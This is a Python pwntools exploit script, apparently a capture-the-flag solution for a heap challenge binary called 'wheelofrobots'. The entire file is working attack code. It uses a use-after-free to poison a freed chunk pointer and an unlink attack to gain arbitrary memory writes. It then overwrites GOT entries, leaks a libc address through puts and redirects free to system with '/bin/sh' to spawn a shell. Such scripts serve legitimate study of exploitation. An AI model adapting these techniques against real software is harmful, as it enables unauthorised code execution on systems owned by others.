from pwn import *

if args['DEBUG']:
    context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./wheelofrobots')
p = process("./wheelofrobots")
gdb.attach(p)
use = 1

def addrobot(id,pro=0):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(id))
    if id == 2:
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(pro))
    elif id == 3:
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(pro))
    elif id == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(pro))


def delrobot(id):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(id))

def changerobot(id,name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(id))
    p.recvuntil("Robot's name: \n")
    p.send(name)

def startrobot():
    p.recvuntil('Your choice :')
    p.sendline('4')

def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)


def write(where,what):
    changerobot(1,p64(where))
    changerobot(6,p64(what))

#stage1:UAF
addrobot(2,1)
delrobot(2)
overflow_benderinuse('\x01')
#raw_input()
changerobot(2,p64(0x603138))	#uaf:set fd
overflow_benderinuse('\x00')
#raw_input()
addrobot(2,1)
addrobot(3,0x20)	#set 0x603140=0x20(devil_size)
addrobot(1)	#add tinny(id=1),get chunk at 0x603138
#stage2:unlink
delrobot(2)	#in order to add robot
delrobot(3)
addrobot(6,5)	#destructor
addrobot(3,7)	#devil
changerobot(1,p64(1000))	#rewrite (destructor size)0x603148,in order to overflow destructor size
#raw_input()
aim = 0x6030e8
FD = aim - 0x18
BK = aim - 0x10
payload = p64(0x0) + p64(0x61) + p64(FD) + p64(BK)
payload = payload.ljust(0x60,'c')
payload = payload + p64(0x60) + p64(0xa0)
changerobot(6,payload) 
delrobot(3)	#trigger unlink
#stage3:exploit
##3.1:any addr write
payload = p64(0) * 5 + p64(0x6030e8)
changerobot(6,payload)	#tiny point to destructor
#raw_input()
exit_got = elf.got['exit']
log.success('exit got addr:' + hex(exit_got))
write(exit_got,0x401954)	#make exit to ret
#raw_input()
##3.2:leak libc
puts_got = elf.got['puts']
write(0x603130,3)	#robot cnt
#raw_input()
changerobot(1,p64(puts_got)) #write puts_got to destuctor
print "puts_got:"
print hex(puts_got)
startrobot()
#raw_input()
p.recvuntil('Thx ')
puts = p.recvuntil('!\n',drop=True).ljust(8,'\x00')
log.success("puts address:" + hex(u64(puts)))
libc_base = u64(puts) - libc.symbols['puts']
log.success("libc base address:" + hex(libc_base))
#raw_input()
##3.3:get shell
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh'))
log.success("system address:" + hex(system))
log.success("binsh address:" + hex(binsh))
free_got = elf.got['free']
atoi_got = elf.got['atoi']
if use == 1 :
    write(free_got,system)
    changerobot(1,p64(binsh))
    delrobot(6)
else:
    write(atoi_got,system)
    p.send("/bin/sh")
raw_input()
p.interactive()
pass

